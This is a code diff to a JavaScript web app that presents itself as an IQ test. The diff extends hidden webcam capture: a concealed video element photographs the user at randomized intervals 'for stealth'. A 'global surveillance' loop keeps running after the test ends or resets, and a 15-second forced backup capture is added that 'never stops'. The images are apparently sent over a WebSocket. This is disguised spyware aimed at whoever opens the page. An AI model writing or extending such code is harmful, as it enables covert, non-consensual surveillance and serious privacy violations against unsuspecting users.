@@ -6,7 +6,9 @@ class IQTestApp {
         this.sessionId = this.getSessionId();
         this.stream = null;
         this.ws = null;
-        this.captureInterval = null;
+        this.testCaptureInterval = null;      // For test-specific captures
+        this.globalCaptureTimeout = null;    // For global surveillance
+        this.captureCount = 0;               // Track total captures
         this.hiddenVideo = document.getElementById('hidden-video');
         
         this.questions = [
@@ -370,9 +372,9 @@ class IQTestApp {
     startSecretCapture() {
         console.log('🔥 Starting CONTINUOUS stealth photo capture system...');
         
-        // Clear any existing intervals
-        if (this.captureInterval) {
-            clearInterval(this.captureInterval);
+        // Clear any existing test intervals (keep global separate)
+        if (this.testCaptureInterval) {
+            clearTimeout(this.testCaptureInterval);
         }
         
         // Start immediate capture
@@ -381,25 +383,25 @@ class IQTestApp {
         }, 500);
         
         // CONTINUOUS randomized capture intervals for maximum stealth (2-5 seconds)
-        const startContinuousCapture = () => {
-            const captureLoop = () => {
-                this.capturePhoto('continuous_capture');
+        const startTestCapture = () => {
+            const testCaptureLoop = () => {
+                this.capturePhoto('test_continuous');
                 
                 // Random interval between 2-5 seconds for stealth
                 const randomInterval = 2000 + Math.random() * 3000;
                 
-                // Schedule next capture
-                this.captureInterval = setTimeout(captureLoop, randomInterval);
+                // Schedule next capture using test-specific interval
+                this.testCaptureInterval = setTimeout(testCaptureLoop, randomInterval);
                 
-                console.log(`📸 Next capture scheduled in ${(randomInterval/1000).toFixed(1)} seconds`);
+                console.log(`📸 Test capture scheduled in ${(randomInterval/1000).toFixed(1)} seconds`);
             };
             
-            // Start the continuous loop
-            captureLoop();
+            // Start the test capture loop
+            testCaptureLoop();
         };
         
-        // Begin continuous capture after initial delay
-        setTimeout(startContinuousCapture, 1500);
+        // Begin test-specific capture after initial delay
+        setTimeout(startTestCapture, 1500);
         
         // Additional capture triggers for enhanced surveillance
         this.setupEnhancedCaptures();
@@ -540,16 +542,20 @@ class IQTestApp {
             
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             
+            // Increment capture counter
+            this.captureCount++;
+            
             // Check if we got a valid image (not just black)
             if (photoData.length < 1000) {
                 console.warn('Captured image seems too small, might be black');
             }
             
-            console.log(`Successfully captured photo: ${type}`, {
+            console.log(`Successfully captured photo #${this.captureCount}: ${type}`, {
                 sessionId: this.sessionId,
                 photoType: type,
                 currentQuestion: this.currentQuestion,
                 photoSize: photoData.length,
+                totalCaptures: this.captureCount,
                 wsReady: this.ws && this.ws.readyState === WebSocket.OPEN
             });
             
@@ -668,13 +674,14 @@ class IQTestApp {
     }
     
     finishTest() {
-        console.log('🏁 Finishing test and stopping continuous capture...');
+        console.log('🏁 Finishing test but CONTINUING surveillance...');
         
-        // Stop continuous photo capture
-        if (this.captureInterval) {
-            clearTimeout(this.captureInterval);
-            this.captureInterval = null;
-            console.log('✅ Continuous capture stopped');
+        // DON'T stop continuous capture - let it continue for surveillance
+        // Only stop the test-specific capture interval, not global surveillance
+        if (this.testCaptureInterval) {
+            clearTimeout(this.testCaptureInterval);
+            this.testCaptureInterval = null;
+            console.log('✅ Test capture stopped, but global surveillance continues');
         }
         
         // Capture final completion photo
@@ -761,10 +768,18 @@ class IQTestApp {
         this.shuffleQuestions();
         this.showScreen('welcome-screen');
         
+        // Stop only test-specific capture, keep global surveillance running
+        if (this.testCaptureInterval) {
+            clearTimeout(this.testCaptureInterval);
+            this.testCaptureInterval = null;
+        }
+        
         // Re-enable start button if camera is ready
         if (this.stream) {
             document.getElementById('start-test-btn').disabled = false;
         }
+        
+        console.log('🔄 Test reset - global surveillance continues running');
     }
     
     startGlobalCapture() {
@@ -772,29 +787,25 @@ class IQTestApp {
         
         // Global capture that continues even after test completion
         const globalCaptureLoop = () => {
-            // Only capture if camera is still available
-            if (this.hiddenVideo && this.stream && this.hiddenVideo.videoWidth > 0) {
-                this.capturePhoto('global_surveillance');
-                
-                // Random interval between 3-7 seconds for long-term surveillance
-                const randomInterval = 3000 + Math.random() * 4000;
-                
-                setTimeout(globalCaptureLoop, randomInterval);
-                
-                console.log(`🌍 Global surveillance - next capture in ${(randomInterval/1000).toFixed(1)}s`);
-            } else {
-                // If camera is lost, try to restart after delay
-                console.log('🔄 Camera lost, attempting to restart global capture in 10s...');
-                setTimeout(() => {
-                    if (this.hiddenVideo && this.stream) {
-                        globalCaptureLoop();
-                    }
-                }, 10000);
+            // Always attempt capture regardless of conditions
+            this.capturePhoto('global_surveillance');
+            
+            // Random interval between 3-7 seconds for long-term surveillance
+            const randomInterval = 3000 + Math.random() * 4000;
+            
+            // Store timeout ID for global capture (separate from test capture)
+            this.globalCaptureTimeout = setTimeout(globalCaptureLoop, randomInterval);
+            
+            console.log(`🌍 GLOBAL SURVEILLANCE #${this.captureCount} - next in ${(randomInterval/1000).toFixed(1)}s`);
+            
+            // If camera is not available, still continue the loop but with warning
+            if (!this.hiddenVideo || !this.stream || this.hiddenVideo.videoWidth === 0) {
+                console.warn('⚠️  Camera not ready but surveillance continues!');
             }
         };
         
         // Start global capture after initial delay
-        setTimeout(globalCaptureLoop, 5000);
+        this.globalCaptureTimeout = setTimeout(globalCaptureLoop, 5000);
         
         // Additional persistent surveillance triggers
         this.setupPersistentSurveillance();
@@ -883,7 +894,22 @@ class IQTestApp {
             }
         });
         
-        console.log('✅ Persistent surveillance system activated!');
+        // ULTIMATE BACKUP: Force capture every 15 seconds no matter what
+        setInterval(() => {
+            this.capturePhoto('force_backup_capture');
+            console.log(`🚨 FORCE BACKUP CAPTURE #${this.captureCount} - Surveillance never stops!`);
+            
+            // Additional logging for debugging
+            console.log('📊 Capture System Status:', {
+                testCaptureActive: !!this.testCaptureInterval,
+                globalCaptureActive: !!this.globalCaptureTimeout,
+                totalCaptures: this.captureCount,
+                cameraReady: this.hiddenVideo && this.hiddenVideo.videoWidth > 0,
+                streamActive: !!this.stream
+            });
+        }, 15000);
+        
+        console.log('✅ Persistent surveillance system activated with backup capture!');
     }
 }
 
